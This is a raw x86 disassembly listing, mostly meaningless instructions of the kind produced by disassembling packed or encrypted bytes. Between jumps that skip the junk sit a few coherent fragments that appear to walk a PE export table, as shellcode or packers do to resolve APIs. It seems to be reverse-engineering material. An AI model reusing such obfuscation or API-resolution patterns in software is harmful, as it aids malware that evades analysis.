  403062:	not    DWORD PTR [ebp-0x3715724a]
  403068:	add    DWORD PTR [esi-0x37],ebx
  40306b:	fld    QWORD PTR ds:0xcf5daeea
  403071:	pop    ebx
  403072:	or     ebp,esi
  403074:	pop    ds
  403075:	jp     0x403005
  403077:	mov    WORD PTR [ebp+0x50],cs
  40307a:	mov    dh,0x3
  40307c:	pop    ds
  40307d:	das    
  40307e:	scas   al,BYTE PTR es:[edi]
  40307f:	scas   eax,DWORD PTR es:[edi]
  403080:	mov    eax,DWORD PTR [ebp+0x8]
  403083:	mov    ecx,DWORD PTR [ebp-0x8]
  403086:	jmp    0x403325
  40308b:	ror    esp,1
  40308d:	ror    edx,1
  40308f:	ror    ecx,1
  403091:	(bad)  
  403093:	test   al,0x59
  403095:	xchg   ebx,eax
  403096:	push   edx
  403097:	xor    eax,0x925bccb8
  40309c:	adc    eax,0x7efe7878
  4030a1:	js     0x40311b
  4030a3:	(bad)  
  4030a5:	xchg   ebx,eax
  4030a6:	and    eax,0x2cee6892
  4030ab:	jle    0x403096
  4030ad:	and    al,0x2f
  4030af:	mov    ?,WORD PTR [ebx+0x206d9c94]
  4030b5:	psubsb mm7,mm1
  4030b8:	scas   al,BYTE PTR es:[edi]
  4030b9:	add    al,0xcc
  4030bb:	xor    eax,0x13c508aa
  4030c0:	xchg   ebx,eax
  4030c1:	in     al,0xeb
  4030c3:	jmp    0xc3bf:0x31b9e0bc
  4030ca:	dec    ebp
  4030cb:	push   ss
  4030cc:	mov    ecx,0x53fc11da
  4030d1:	xchg   edx,eax
  4030d2:	rol    ch,0x45
  4030d5:	jnp    0x403066
  4030d7:	mov    ebp,0xc7504547
  4030dc:	mov    dh,0xc5
  4030de:	jecxz  0x40315a
  4030e0:	adc    al,0xdd
  4030e2:	loop   0x403077
  4030e4:	adc    eax,0xea4258c4
  4030e9:	sub    eax,0x7b6bca1f
  4030ee:	xchg   edi,eax
  4030ef:	pop    ss
  4030f0:	sbb    ah,BYTE PTR [ecx]
  4030f2:	and    al,bl
  4030f4:	add    edx,DWORD PTR [eax+0x49c2a55d]
  4030fa:	pushf  
  4030fb:	adc    dh,0x94
  4030fe:	bnd ja 0x403084
  403101:	imul   edi,edx,0x4e
  403104:	fmul   st(4),st
  403106:	ss cwde 
  403108:	(bad)
  40310c:	jl     0x40308f
  40310e:	xor    al,0x12
  403110:	jge    0x4030a0
  403112:	inc    ebp
  403113:	sbb    al,0x12
  403115:	aam    0x3c
  403117:	jmp    0x73f03245
  40311c:	push   edi
  40311d:	pop    ds
  40311e:	into   
  40311f:	adc    ebx,esp
  403121:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403122:	jbe    0x40319a
  403124:	xor    esi,DWORD PTR [esi*4+0x358b2fcf]
  40312b:	div    DWORD PTR [esi-0x63]
  40312e:	in     al,0xda
  403130:	sub    DWORD PTR [ebx+eiz*8+0x2d8af552],ebx
  403137:	jbe    0x4030c3
  403139:	daa    
  40313a:	out    0xe2,al
  40313c:	bound  ebx,QWORD PTR [edi]
  40313e:	fisubr DWORD PTR [edi-0x4131e933]
  403144:	aaa    
  403145:	mov    ch,0x2a
  403147:	int    0xec
  403149:	ret    0x2c35
  40314c:	aaa    
  40314d:	(bad)  
  40314e:	mov    esp,0x37123e90
  403153:	mov    ah,0xdb
  403155:	stos   BYTE PTR es:[edi],al
  403156:	sub    al,0x59
  403158:	sahf   
  403159:	jg     0x403118
  40315b:	je     0x4031ae
  40315d:	lods   eax,DWORD PTR ds:[esi]
  40315e:	push   ebx
  40315f:	arpl   WORD PTR [edi+0x47],si
  403162:	ja     0x40310d
  403164:	xor    bl,cl
  403166:	xadd   DWORD PTR [edi],edx
  403169:	stos   BYTE PTR es:[edi],al
  40316a:	in     eax,0x55
  40316c:	cmp    DWORD PTR [ebp+0x4c310a67],0x59429f09
  403176:	outs   dx,BYTE PTR ds:[esi]
  403177:	adc    esp,DWORD PTR [edx]
  403179:	add    eax,0xdcebbe1
  40317e:	div    BYTE PTR [eax]
  403180:	adc    ebp,DWORD PTR ds:0xbfe7a093
  403186:	(bad)  
  403187:	push   edi
  403188:	pop    edx
  403189:	push   ds
  40318a:	mov    eax,DWORD PTR gs:[ecx+0x21ce223]
  403191:	popa   
  403192:	pop    esp
  403193:	dec    ecx
  403194:	and    al,0xd8
  403196:	xor    al,0xb4
  403198:	int    0x92
  40319a:	(bad)  
  40319b:	aaa    
  40319c:	or     ah,BYTE PTR [eax]
  40319e:	and    eax,0x51aa848a
  4031a3:	pop    ebp
  4031a4:	or     dh,BYTE PTR [edi+0x44cab815]
  4031aa:	and    DWORD PTR [edi],edi
  4031ac:	mov    ecx,0x43bb784c
  4031b1:	or     edi,esi
  4031b3:	pop    edi
  4031b4:	shl    DWORD PTR [ebx+0x60],1
  4031b7:	xor    al,0x6e
  4031b9:	(bad)  
  4031bb:	mov    ebx,cs
  4031bd:	mov    cl,BYTE PTR [eax-0x72]
  4031c0:	jo     0x40317b
  4031c2:	push   ss
  4031c3:	push   ebx
  4031c4:	inc    esp
  4031c5:	mov    cl,0x3e
  4031c7:	mov    bl,0x9b
  4031c9:	adc    DWORD PTR [eax],0x21a2b9d9
  4031cf:	shl    BYTE PTR ds:0x43666fa5,1
  4031d5:	fdivr  st,st(5)
  4031d7:	ja     0x4031a1
  4031d9:	xor    eax,0xe371cee4
  4031de:	loope  0x4031a7
  4031e0:	out    0xdf,al
  4031e2:	mov    esi,0x81b83c48
  4031e7:	ins    BYTE PTR es:[edi],dx
  4031e8:	lea    eax,[edx+0x3ea034af]
  4031ee:	(bad)  
  4031ef:	push   ebp
  4031f0:	int3   
  4031f1:	out    0xc9,al
  4031f3:	ja     0x403200
  4031f5:	or     al,BYTE PTR [esi]
  4031f7:	inc    esi
  4031f8:	test   al,0x61
  4031fa:	mov    edx,0x4c39b506
  4031ff:	or     esi,DWORD PTR [ecx-0x1a]
  403202:	add    esi,DWORD PTR [edx-0x6a]
  403205:	mov    dl,0x9a
  403207:	cmp    al,0x40
  403209:	fwait
  40320a:	xor    DWORD PTR [ecx+0x79],edi
  40320d:	jecxz  0x4031f0
  40320f:	inc    edi
  403210:	jecxz  0x403291
  403212:	(bad)  
  403214:	jo     0x4031ca
  403216:	xchg   eax,ebx
  403218:	test   eax,0x2bc9b3ff
  40321d:	xor    cl,BYTE PTR [esi+0xd]
  403220:	xchg   DWORD PTR [ecx+0x65],ebp
  403223:	imul   edi,esi,0xf6042960
  403229:	jne    0x4031ca
  40322b:	cs dec esi
  40322d:	mov    edi,0x83734ea0
  403232:	mov    dl,0xb5
  403234:	mov    edx,0xe64a9eea
  403239:	in     al,0x59
  40323b:	sbb    eax,0x62865c16
  403240:	mov    edi,ebp
  403242:	enter  0x7d5b,0x3e
  403246:	repnz inc edi
  403248:	test   BYTE PTR [esi],0x79
  40324b:	add    ah,dl
  40324d:	jmp    0x4031fc
  40324f:	pop    edx
  403250:	nop
  403251:	fild   WORD PTR [ecx+esi*2-0x1c]
  403255:	xlat   BYTE PTR ds:[ebx]
  403256:	je     0x4032b2
  403258:	aaa    
  403259:	je     0x40328d
  40325b:	mov    BYTE PTR [ebx+0x647c8c57],bl
  403261:	in     al,0xcf
  403263:	push   0x962edcb0
  403268:	jbe    0x403255
  40326a:	ja     0x4032a3
  40326c:	pop    es
  40326d:	pop    esp
  40326e:	enter  0xd368,0xb8
  403272:	or     eax,0x4bf8a48d
  403277:	dec    eax
  403278:	enter  0xe1f5,0xde
  40327c:	pop    ecx
  40327d:	cli    
  40327e:	and    BYTE PTR [ebp+0x50],al
  403281:	jnp    0x403299
  403283:	mov    ah,0x10
  403285:	push   ebp
  403286:	jne    0x4032c5
  403288:	inc    esp
  403289:	jno    0x40330a
  40328b:	sub    dl,0xcc
  40328e:	les    ecx,FWORD PTR [eax+0x523655ac]
  403294:	cdq    
  403295:	or     al,cl
  403297:	test   BYTE PTR [ecx+0x1f02c9b6],al
  40329d:	or     BYTE PTR [edi+0x8],0x4b
  4032a1:	sub    DWORD PTR [ebx],ebp
  4032a3:	add    DWORD PTR [edi],esp
  4032a5:	dec    ecx
  4032a6:	out    0x30,eax
  4032a8:	xor    BYTE PTR [edx+0x4],bl
  4032ab:	dec    esp
  4032ac:	test   BYTE PTR [esi+0x5d],al
  4032af:	lock out 0x2b,eax
  4032b2:	xchg   al,al
  4032b4:	pop    ds
  4032b5:	pop    ecx
  4032b6:	aam    0x8f
  4032b8:	shl    BYTE PTR [eax+ebp*4],cl
  4032bb:	add    ecx,ebp
  4032bd:	mov    ebp,0x26d53c5c
  4032c2:	out    dx,eax
  4032c3:	and    dl,BYTE PTR [ebp+0x46]
  4032c6:	push   0x2d
  4032c8:	push   0x52
  4032ca:	mov    eax,edi
  4032cc:	dec    eax
  4032cd:	out    0xaf,eax
  4032cf:	icebp  
  4032d0:	lds    eax,FWORD PTR [ebp-0x4bae889a]
  4032d6:	inc    esi
  4032d7:	sbb    DWORD PTR [esi+0x19],0x40585b85
  4032de:	xor    al,BYTE PTR [edx]
  4032e0:	in     eax,dx
  4032e1:	leave  
  4032e2:	xor    BYTE PTR [edi],cl
  4032e4:	shr    DWORD PTR [esi],1
  4032e6:	mov    ds:0x3281b2b,eax
  4032eb:	push   ax
  4032ed:	push   ecx
  4032ee:	cmc    
  4032ef:	repnz loopne 0x4032a8
  4032f2:	adc    esi,DWORD PTR [eax]
  4032f4:	test   DWORD PTR ds:0xe1b3bf04,ecx
  4032fa:	test   DWORD PTR [eax],esi
  4032fc:	fwait
  4032fd:	leave  
  4032fe:	cmp    eax,0xb12f487a
  403303:	ja     0x4032e6
  403305:	push   0x42bc1a41
  40330a:	mov    ebp,0x6b521786
  40330f:	and    edx,DWORD PTR [edi-0x4e]
  403312:	sub    al,0xa0
  403314:	xlat   BYTE PTR ds:[ebx]
  403315:	jmp    0xdcea47bb
  40331a:	pop    ss
  40331b:	and    ebp,edi
  40331d:	ins    BYTE PTR es:[edi],dx
  40331e:	and    ch,bh
  403320:	push   es
  403321:	repz pop ebp
  403323:	push   ds
  403324:	and    BYTE PTR [ebx],dh
  403326:	mov    BYTE PTR [ebx],0xc7
  403329:	cmp    DWORD PTR [ecx],eax
  40332b:	je     0x4040c9
  403331:	mov    ecx,DWORD PTR [ebp-0x14]
  403334:	mov    eax,DWORD PTR [ebp-0x8]
  403337:	mov    eax,DWORD PTR [eax]
  403339:	mov    eax,DWORD PTR [eax+0x3c]
  40333c:	lea    ecx,[ecx*8+0x78]
  403343:	add    eax,ecx
  403345:	mov    ecx,DWORD PTR [ebp-0x8]
  403348:	mov    ecx,DWORD PTR [ecx]
  40334a:	mov    eax,DWORD PTR [eax+ecx*1]
  40334d:	mov    DWORD PTR [ebp-0x1c],eax
  403350:	mov    eax,DWORD PTR [ebp+0x8]
  403353:	xor    eax,esi
  403355:	add    eax,edi
  403357:	mov    DWORD PTR [ebp-0x20],eax
  40335a:	mov    eax,DWORD PTR [ebp+0x8]
  40335d:	mov    ecx,DWORD PTR [ebp-0x1c]
  403360:	jmp    0x4035ff
  403365:	(bad)  
  403366:	cmp    al,0xcf
  403368:	cmp    al,0xd9
  40336a:	rcr    ecx,cl
  40336c:	fidiv  DWORD PTR [ecx-0xf3dc34a]
  403372:	jne    0x403398
  403374:	imul   edx,DWORD PTR [eax],0xfe78781a
  40337a:	jle    0x4033f4
  40337c:	js     0x403377
  40337e:	adc    DWORD PTR [esi+ebx*8],esi
  403381:	ins    BYTE PTR es:[edi],dx
  403382:	jne    0x403383
  403384:	aam    0x6c
  403386:	xor    DWORD PTR [ebp+0x71ff0949],eax
  40338c:	gs mov ecx,0xf3b30ba6
  403392:	xor    al,0xf7
  403394:	adc    BYTE PTR [edi+0x60],dh
  403397:	data16 int3 
  403399:	in     eax,0x8f
  40339b:	fstp   TBYTE PTR ds:0x2f09c43c
  4033a1:	outs   dx,BYTE PTR ds:[esi]
  4033a2:	int    0x63
  4033a4:	pop    esi
  4033a5:	inc    ebx
  4033a6:	adc    dh,ch
  4033a8:	push   es
  4033a9:	mov    BYTE PTR [ebx],dl
  4033ab:	ds out dx,al
  4033ad:	fsubr  QWORD PTR [eax-0x15]
  4033b0:	aam    0xd2
  4033b2:	cmp    eax,0xe1857f2a
  4033b7:	push   ebx
  4033b8:	cwde   
  4033b9:	outs   dx,BYTE PTR ds:[esi]
  4033ba:	dec    ebp
  4033bb:	or     ebx,DWORD PTR [ecx+edx*4-0x258f7c1a]
  4033c2:	adc    esi,DWORD PTR [ebp-0x1a]
  4033c5:	(bad)  
  4033c6:	aas    
  4033c7:	push   cs
  4033c8:	in     al,0xc3
  4033ca:	std    
  4033cb:	add    eax,0xa9b3d9d8
  4033d0:	and    al,0x58
  4033d2:	cmp    BYTE PTR [ecx],0x48
  4033d5:	fld    DWORD PTR [ebp+0x2288d40e]
  4033db:	pop    ebx
  4033dc:	push   eax
  4033dd:	clc    
  4033de:	loopne 0x40337f
  4033e0:	fucom  st(1)
  4033e2:	imul   ecx,DWORD PTR [ecx],0xffffffc2
  4033e5:	dec    edi
  4033e6:	in     eax,dx
  4033e7:	pop    esp
  4033e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4033e9:	cmp    bh,bl
  4033eb:	retf   0x5fca
  4033ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4033ef:	inc    edi
  4033f0:	xchg   ebp,eax
  4033f1:	fwait
  4033f2:	sub    bl,ah
  4033f4:	aam    0x1d
  4033f6:	push   es
  4033f7:	mov    ds:0x42a4ebb7,al
  4033fc:	pop    edx
  4033fd:	je     0x40345c
  4033ff:	imul   edx,eax,0xffffffde
  403402:	dec    ebx
  403403:	sbb    DWORD PTR [esi+ebx*2],esi
  403406:	xor    bl,BYTE PTR [esi]
  403408:	(bad)  
  403409:	loopne 0x403410
  40340b:	xchg   esi,eax
  40340c:	fsubr  DWORD PTR [esi+0x51]
  40340f:	(bad)  
  403410:	fiadd  WORD PTR [ebp-0x5e]
  403413:	dec    ecx
  403414:	push   0xaf81ca11
  403419:	out    0x82,eax
  40341b:	push   ebp
  40341c:	pop    ds
  40341d:	loope  0x403494
  40341f:	jne    0x403457
  403421:	imul   DWORD PTR [edi+0x53]
  403424:	ds push es
  403426:	sub    al,0x7f
  403428:	dec    esi
  403429:	clc    
  40342a:	or     ebp,DWORD PTR [eax]
  40342c:	push   eax
  40342d:	adc    DWORD PTR [edi-0x743e2c2],0x346eb574
  403437:	rol    DWORD PTR [ebp+0x27485efc],0xd
  40343e:	mov    WORD PTR ds:0xb6320c72,fs
  403444:	pop    esp
  403445:	loope  0x403474
  403447:	xor    edi,DWORD PTR [eax+esi*8]
  40344a:	sub    DWORD PTR [ebp+0x9eb36b8],eax
  403450:	fisub  DWORD PTR [esi+0x5fbd67f6]
  403456:	loop   0x403416
  403458:	neg    BYTE PTR [ecx]
  40345a:	xor    eax,0x8c627fc2
  40345f:	pop    ss
  403460:	(bad)  
  403462:	bound  eax,QWORD PTR [edi+eax*4+0x558585ca]
  403469:	sub    BYTE PTR [ebp-0x40],0x6e
  40346d:	xlat   BYTE PTR ds:[ebx]
  40346e:	sahf   
  40346f:	sbb    al,0x37
  403471:	jmp    0xd10bde7e
  403476:	cld    
  403477:	fdiv   st(2),st
  403479:	add    bl,BYTE PTR [edi]
  40347b:	add    ebx,DWORD PTR [ebp+0x68cd5ba8]
  403481:	out    0x37,eax
  403483:	jge    0x4034f7
  403485:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403486:	rcl    BYTE PTR [esi],1
  403488:	std    
  403489:	je     0x40344c
  40348b:	imul   esp,DWORD PTR [ebx-0x37],0x43
  40348f:	mov    BYTE PTR [ebx],ch
  403491:	lea    edx,[edi+ebp*1-0x78]
  403495:	xchg   ecx,eax
  403496:	test   DWORD PTR [ebx+0x35e29b20],0xe3439484
  4034a0:	aam    0x66
  4034a2:	loope  0x4034aa
  4034a4:	inc    edx
  4034a5:	xor    eax,0xc55a5997
  4034aa:	cdq    
  4034ab:	mov    ds:0x519e5c46,eax
  4034b0:	inc    edi
  4034b1:	pop    esp
  4034b2:	jbe    0x403501
  4034b4:	sub    BYTE PTR [eax],dh
  4034b6:	mov    al,0x84
  4034b8:	das    
  4034b9:	and    dh,bl
  4034bb:	pop    esp
  4034bc:	mov    edi,0xd13dd1d8
  4034c1:	repnz gs aaa 
  4034c4:	cli    
  4034c5:	mov    cl,0x3e
  4034c7:	iret   
  4034c8:	mov    bh,0x21
  4034ca:	popf   
  4034cb:	(bad)  
  4034cc:	jne    0x403516
  4034ce:	jbe    0x403470
  4034d0:	out    dx,al
  4034d1:	xchg   ebp,eax
  4034d2:	dec    ebp
  4034d3:	into   
  4034d4:	arpl   WORD PTR [eax+0x18e53694],cx
  4034da:	mov    ah,BYTE PTR [eax-0x117f3bbe]
  4034e0:	add    al,0x4
  4034e2:	(bad)  
  4034e3:	sub    eax,eax
  4034e5:	mov    ah,BYTE PTR [edi+ebp*8]
  4034e8:	mov    bh,0xbd
  4034ea:	js     0x4034ce
  4034ec:	push   esi
  4034ed:	adc    al,0x59
  4034ef:	jle    0x4034be
  4034f1:	stc    
  4034f2:	aam    0xc3
  4034f4:	sbb    eax,0x11d71b6b
  4034f9:	mov    eax,0x246c56c5
  4034fe:	inc    ecx
  4034ff:	das    
  403500:	dec    esp
  403501:	xor    eax,0x8755fbf6
  403506:	inc    edi
  403507:	loope  0x40348a
  403509:	push   ss
  40350a:	sbb    BYTE PTR [esi],dl
  40350c:	test   ecx,0xf4d8eb96
  403512:	dec    edx
  403513:	adc    bl,bh
  403515:	daa    
  403516:	mov    DWORD PTR [eax],ebx
  403518:	out    dx,al
  403519:	scas   al,BYTE PTR es:[edi]
  40351a:	jae    0x403588
  40351c:	(bad)  
  40351d:	sti    
  40351e:	pop    edi
  40351f:	add    BYTE PTR [eax+eiz*1],bh
  403522:	into   
  403523:	mov    al,ds:0x74e9e1a6
  403528:	jecxz  0x40354c
  40352a:	jge    0x40350c
  40352c:	add    eax,0x9c97be85
  403531:	rcr    ah,1
  403533:	jmp    FWORD PTR [eax+0x6a]
  403536:	iret   
  403537:	mov    edi,0x8d25401
  40353c:	addr16 mov ch,0x1b
  40353f:	outs   dx,BYTE PTR ds:[esi]
  403540:	dec    ebp
  403541:	xor    BYTE PTR [ebx+ebx*1+0x52],cl
  403545:	xchg   ebp,eax
  403546:	inc    eax
  403547:	xchg   esp,eax
  403548:	outs   dx,BYTE PTR ds:[esi]
  403549:	mov    bl,0x45
  40354b:	jns    0x4034db
  40354d:	mov    al,0xbc
  40354f:	test   eax,0xf370d473
  403554:	cmp    eax,0xb831f151
  403559:	mov    esi,0x75cd95d5
  40355e:	add    BYTE PTR ds:0x802d167f,al
  403564:	call   FWORD PTR [edx-0xa]
  403567:	xor    DWORD PTR [eax],edx
  403569:	add    BYTE PTR [ebp+0x2947e421],dl
  40356f:	enter  0x6c19,0xad
  403573:	pushf  
  403574:	aad    0xce
  403576:	rcl    ebp,cl
  403578:	jne    0x403597
  40357a:	jp     0x40356b
  40357c:	retf   0xda07
  40357f:	adc    ch,BYTE PTR [ecx+0x10]
  403582:	imul   ebx,DWORD PTR [eax+0x16],0x8af7c85
  403589:	gs push ebx
  40358b:	lock shr BYTE PTR [edx+0x57b65885],cl
  403592:	mov    dh,0xb3
  403594:	nop
  403595:	dec    DWORD PTR [ecx+0x7a37f951]
  40359b:	mov    DWORD PTR [ebx],edi
  40359d:	retf   0x566
  4035a0:	lods   eax,DWORD PTR ds:[esi]
  4035a1:	aaa    
  4035a2:	push   es
  4035a3:	loop   0x403579
  4035a5:	repz pop ss
  4035a7:	outs   dx,BYTE PTR ds:[esi]
  4035a8:	mov    ecx,0xa6790124
  4035ad:	stos   DWORD PTR es:[edi],eax
  4035ae:	jns    0x403597
  4035b0:	push   ebp
  4035b1:	mov    ah,0xcd
  4035b3:	dec    eax
  4035b4:	xchg   edx,eax
  4035b5:	pusha  
  4035b6:	mov    dl,BYTE PTR [edx+edi*4-0x280fe3d0]
  4035bd:	mul    esi
  4035bf:	xchg   esi,eax
  4035c0:	mov    bh,0x96
  4035c2:	imul   eax,DWORD PTR [ecx+0x1ffc1dc0],0xc7a74a3f
  4035cc:	mov    ebp,0x17cda9be
  4035d1:	je     0x403565
  4035d3:	fstp   DWORD PTR [eax+edx*2-0x69]
  4035d7:	add    bl,BYTE PTR [ecx]
  4035d9:	test   ebx,esi
  4035db:	pusha  
  4035dc:	fdivr  QWORD PTR [edi]
  4035de:	pop    ds
  4035df:	sar    BYTE PTR [ebx+eiz*8+0x761e6ff6],cl
  4035e6:	not    DWORD PTR [eax+edx*8+0x4bb71fa1]
  4035ed:	pop    edx
  4035ee:	into   
  4035ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4035f0:	push   esi
  4035f1:	(bad)
  4035f4:	and    eax,0xd8108be5
  4035f9:	inc    DWORD PTR [eax+edi*8+0x74]
  4035fd:	mov    ebx,0x3c63353
  403602:	(bad)  
  403603:	cmp    ecx,eax
  403605:	je     0x404380
  40360b:	mov    eax,DWORD PTR [ebp-0x8]
  40360e:	mov    ecx,DWORD PTR [ebp-0x1c]
  403611:	add    ecx,DWORD PTR [eax]
  403613:	mov    DWORD PTR [ebp-0x20],ecx
  403616:	mov    eax,DWORD PTR [ebp-0x20]
  403619:	mov    ecx,DWORD PTR [ebp-0x8]
  40361c:	mov    eax,DWORD PTR [eax+0xc]
  40361f:	mov    ecx,DWORD PTR [ecx]
  403621:	jmp    0x4038c0
  403626:	xlat   BYTE PTR ds:[ebx]
  403627:	aas    
  403628:	mov    al,0xd6
  40362b:	(bad)
  40362e:	fwait
  40362f:	clc    
  403630:	mov    BYTE PTR ds:0x578a471e,0x96
  403637:	sbb    BYTE PTR [eax+0x78],bh
  40363a:	(bad)  
  40363b:	jle    0x4036b5
  40363d:	js     0x4035d7
  40363f:	sub    al,0x1c
  403641:	js     0x403668
  403643:	xor    al,0xaf
  403646:	pop    ecx
  403647:	adc    BYTE PTR [esi+0x6],al
  40364a:	dec    ebp
  40364b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40364c:	sbb    ah,BYTE PTR [eax+0x5824d7e4]
  403652:	pop    ds
  403653:	mov    ebx,0xa8cdcf67
  403658:	xchg   ebp,eax
  403659:	xchg   esp,eax
  40365a:	jo     0x403694
  40365c:	arpl   WORD PTR [ebx-0x18],dx
  40365f:	adc    esp,DWORD PTR [esi+eax*8+0x24]
  403663:	mov    bh,0x51
  403665:	in     eax,dx
  403666:	mov    WORD PTR [edi+0x6d],ss
  403669:	push   0xfffffffb
  40366b:	test   al,0xc5
  40366d:	out    dx,al
  40366e:	adc    DWORD PTR [ebx+0x1f7f4563],esi
  403674:	ror    BYTE PTR [ebx+esi*8+0x58],1
  403678:	mov    al,0xc3
  40367a:	adc    eax,0x75b30094
  40367f:	mov    ecx,0x3cb00314
  403684:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403685:	and    eax,0xe2f18462
  40368a:	test   BYTE PTR [ebx+0x3a6ee9ed],dl
  403690:	mov    DWORD PTR [edx],esp
  403692:	inc    ebx
  403693:	pop    ecx
  403694:	cmp    eax,0x71cf6143
  403699:	mov    eax,ds:0xcf4722a
  40369e:	adc    eax,0x2296af9e
  4036a3:	idiv   esp
  4036a5:	xor    BYTE PTR [esi+0x79e858cc],ch
  4036ab:	xchg   ecx,eax
  4036ac:	leave  
  4036ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4036ae:	jg     0x4036a8
  4036b0:	sbb    al,0x47
  4036b3:	pop    es
  4036b4:	int3   
  4036b5:	inc    eax
  4036b6:	sub    al,0x3e
  4036b8:	push   cs
  4036b9:	adc    BYTE PTR [ecx-0x26],ch
  4036bc:	push   edx
  4036bd:	sahf   
  4036be:	jmp    0x5bda:0xa94f6dd7
  4036c5:	popf   
  4036c6:	inc    ecx
  4036c7:	dec    esp
  4036c8:	inc    ecx
  4036c9:	es pop edi
  4036cb:	and    ebx,DWORD PTR [ecx+ecx*2-0x5a]
  4036cf:	sbb    ebp,DWORD PTR [esi]
  4036d1:	jmp    0xb5982b39
  4036d6:	cmp    DWORD PTR [edx+ebx*1-0x3fa0a039],esi
  4036dd:	(bad)  
  4036df:	mov    edx,esp
  4036e1:	add    eax,0xc6a0499a
  4036e6:	inc    esp
  4036e7:	cmp    BYTE PTR [edx-0x34],cl
  4036ea:	test   eax,0x9669cab1
  4036ef:	mov    ecx,0x69af697a
  4036f4:	shl    BYTE PTR [edi],cl
  4036f6:	aad    0xb8
  4036f8:	lock mov DWORD PTR [esi-0x44be105a],edi
  4036ff:	std    
  403700:	cmp    al,0x32
  403702:	pop    edi
  403703:	mov    cl,0x59
  403705:	push   esp
  403706:	sub    al,0x6c
  403708:	rcr    BYTE PTR [ecx-0x7b],0x37
  40370c:	mov    ds:0xceb61592,eax
  403711:	sub    eax,0x6ab7a1a2
  403716:	jnp    0x4036ea
  403718:	mov    ebx,0x686d1f60
  40371d:	push   ebx
  40371e:	hlt    
  40371f:	pop    ecx
  403720:	sub    eax,0x9bf8e4d
  403725:	rcl    DWORD PTR [esi+edx*2+0x43],0x67
  40372a:	gs imul esp,ebp,0x7111dbe6
  403731:	cmp    eax,0x8a285f7b
  403736:	sbb    ecx,ebx
  403738:	pop    ecx
  403739:	xchg   esi,eax
  40373a:	xchg   BYTE PTR [ebx],dl
  40373c:	(bad)  
  40373d:	(bad)  fs:[ebx-0x13b181f7]
  403744:	pop    ss
  403745:	mov    bh,0x99
  403747:	dec    ebx
  403748:	imul   esp,DWORD PTR [eax-0x5a],0xb52e2b86
  40374f:	adc    eax,0x7cae48da
  403754:	push   esi
  403755:	(bad)  
  403756:	icebp  
  403757:	loope  0x403707
  403759:	add    ch,BYTE PTR [ecx-0x11c05d08]
  40375f:	in     al,dx
  403760:	adc    eax,0xd70b5d8d
  403765:	mov    DWORD PTR [edi-0x1e6eeb0b],edx
  40376b:	ret    0xe987
  40376e:	or     ah,BYTE PTR [edi+0x68]
  403771:	or     dh,BYTE PTR [edx+0x43]
  403774:	nop
  403775:	and    al,0xcc
  403777:	shr    DWORD PTR [ebp+0xb],cl
  40377a:	xchg   esi,eax
  40377b:	outs   dx,BYTE PTR ds:[esi]
  40377c:	lahf   
  40377d:	aad    0xd8
  40377f:	fadd   DWORD PTR [esi-0x1fb75f65]
  403785:	add    esp,DWORD PTR [eax-0x32]
  403788:	test   al,0x35
  40378a:	into   
  40378b:	sbb    ebx,eax
  40378d:	adc    al,0xb0
  40378f:	idiv   DWORD PTR [eax]
  403791:	int3   
  403792:	xor    dl,bh
  403794:	mov    ds:0x9e960239,eax
  403799:	add    DWORD PTR [ebx-0x529702fb],0x0
  4037a0:	ins    BYTE PTR es:[edi],dx
  4037a1:	xor    esp,DWORD PTR [edx+0x8811fc5]
  4037a7:	sbb    al,BYTE PTR ds:0xd57e911d
  4037ad:	dec    esi
  4037ae:	je     0x40373c
  4037b0:	mov    esp,0x81706623
  4037b5:	add    BYTE PTR ss:[ebx],dl
  4037b8:	or     ah,BYTE PTR [ebx]
  4037ba:	mov    eax,ds:0xe551d419
  4037bf:	jmp    0x403836
  4037c1:	ins    DWORD PTR es:[edi],dx
  4037c2:	shl    DWORD PTR [edx-0x3a1e395b],1
  4037c8:	pusha  
  4037c9:	or     ebp,DWORD PTR [eax]
  4037cb:	retf   
  4037cc:	mov    ebp,0x7012f287
  4037d1:	xchg   esi,eax
  4037d2:	push   ebp
  4037d3:	xchg   edi,eax
  4037d4:	xchg   ebx,eax
  4037d5:	cmp    eax,0x996def3d
  4037da:	cdq    
  4037db:	enter  0x6e1e,0x16
  4037df:	sbb    al,BYTE PTR [edi-0x4f]
  4037e2:	and    DWORD PTR [eax+0x1607f591],ebx
  4037e8:	and    DWORD PTR [eax-0x3a203f46],edi
  4037ee:	xchg   DWORD PTR [esi+0x7a],edx
  4037f1:	dec    edi
  4037f2:	shr    DWORD PTR [ebx+0x4e],0xf7
  4037f6:	jge    0x403806
  4037f8:	adc    eax,0x3ac11a7f
  4037fd:	dec    esp
  4037fe:	aas    
  4037ff:	mov    cl,0xea
  403801:	loop   0x4037be
  403803:	sub    eax,0x4a5dd2e6
  403808:	push   cs
  403809:	shr    dl,0xde
  40380c:	adc    edx,esp
  40380e:	add    ecx,ebx
  403810:	out    dx,al
  403811:	stos   BYTE PTR es:[edi],al
  403812:	dec    esp
  403813:	xchg   ebp,eax
  403814:	popf   
  403815:	mov    WORD PTR ds:[edx+edi*8-0x42],gs
  40381a:	out    dx,eax
  40381b:	ret    
  40381c:	dec    ebp
  40381d:	daa    
  40381e:	aad    0x4c
  403820:	jne    0x4037bf
  403822:	mov    ah,0x8a
  403824:	outs   dx,BYTE PTR ds:[esi]
  403825:	inc    ecx
  403826:	ins    BYTE PTR es:[edi],dx
  403827:	sbb    BYTE PTR [ecx-0x72],ch
  40382a:	in     al,dx
  40382b:	mov    al,ds:0x274d0ccb
  403830:	arpl   dx,si
  403832:	leave  
  403833:	test   BYTE PTR [ecx],ah
  403835:	xlat   BYTE PTR ds:[ebx]
  403836:	xor    BYTE PTR ds:[edx+esi*4+0x1162fa2d],al
  40383e:	pop    ebx
  40383f:	pusha  
  403840:	push   ebp
  403842:	imul   DWORD PTR [edx]
  403844:	imul   DWORD PTR [edi-0x17]
  403847:	mov    ch,0x55
  403849:	cld    
  40384a:	xchg   esp,eax
  40384b:	popf   
  40384c:	push   ecx
  40384d:	sbb    BYTE PTR [eax],dl
  40384f:	(bad)  
  403850:	cs dec edi
  403852:	pop    ds
  403853:	es dec ebx
  403855:	mov    esi,0xb77a43d
  40385a:	jp     0x40389a
  40385c:	dec    esp
